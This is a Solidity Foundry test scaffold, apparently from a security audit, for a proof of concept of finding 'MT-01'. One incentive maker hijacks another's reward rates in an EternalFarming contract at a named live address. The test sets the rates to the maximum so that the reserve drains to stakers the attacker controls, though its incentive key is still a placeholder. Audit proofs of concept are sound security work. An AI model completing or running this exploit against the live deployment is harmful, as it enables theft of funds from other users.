// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";

/// MT-01 confirm-test scaffold: EternalFarming setRates lacks incentive-
/// ownership binding. Requires fork + two INCENTIVE_MAKERs to execute.
/// Run once a second whitelisted maker is identified:
///   forge test --fork-url https://evm.mantrachain.io --match-contract RateHijack -vv
interface IEternalFarming {
    struct IncentiveKey {
        address rewardToken;
        address bonusRewardToken;
        address pool;
        uint256 nonce;
    }

    function setRates(IncentiveKey memory key, uint128 r0, uint128 r1) external;
    function deactivateIncentive(IncentiveKey memory key) external;
}

contract RateHijack is Test {
    IEternalFarming farming =
        IEternalFarming(0x50FCbF85d23aF7C91f94842FeCd83d16665d27bA);

    function test_makerB_hijacks_makerA_incentive() public {
        // TODO fill with a real live IncentiveKey (read from events)
        IEternalFarming.IncentiveKey memory key = IEternalFarming.IncentiveKey({
            rewardToken: address(0),
            bonusRewardToken: address(0),
            pool: address(0),
            nonce: 0
        });
        // maker A funded `key`; maker B (impersonated) redirects rates:
        vm.prank(address(0xB)); // must hold INCENTIVE_MAKER
        farming.setRates(key, type(uint128).max, type(uint128).max);
        // assertion: reserve drains into growth within next distribution;
        // stakers positioned by B capture it.
    }
}
